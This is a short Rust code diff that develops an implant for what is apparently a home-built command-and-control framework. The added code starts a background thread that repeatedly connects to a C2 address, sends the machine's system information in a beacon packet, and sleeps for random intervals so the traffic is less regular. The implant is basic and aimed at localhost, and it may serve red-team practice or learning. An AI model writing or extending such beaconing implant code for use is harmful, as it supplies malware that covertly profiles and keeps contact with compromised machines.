@@ -1,15 +1,41 @@
-use std::{io::Write, net::TcpStream};
+use std::{
+    io::Write,
+    net::TcpStream,
+    thread::{self, sleep},
+    time::Duration,
+};
 
-use common::{Packet, SystemInfo, encode};
+const C2_ADDRESS: &str = "127.0.0.1:9120";
+
+use common::{IMPLANT_REPORT_RATE_SECONDS, Packet, SystemInfo, encode};
+use rand::{Rng, rng};
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let mut connection = TcpStream::connect("127.0.0.1:9120")?;
+    start_reporting_thread();
 
-    let packet = Packet::Beacon {
-        system_info: SystemInfo::get(),
-    };
+    loop {}
+}
 
-    connection.write(encode(&packet).unwrap().as_slice())?;
+fn start_reporting_thread() {
+    thread::spawn(move || {
+        loop {
+            connect()
+                .write(
+                    encode(&Packet::Beacon {
+                        system_info: SystemInfo::get(),
+                    })
+                    .unwrap()
+                    .as_slice(),
+                )
+                .unwrap();
 
-    Ok(())
+            sleep(Duration::from_secs(
+                rng().random_range(IMPLANT_REPORT_RATE_SECONDS),
+            ));
+        }
+    });
+}
+
+fn connect() -> TcpStream {
+    TcpStream::connect(C2_ADDRESS).unwrap()
 }
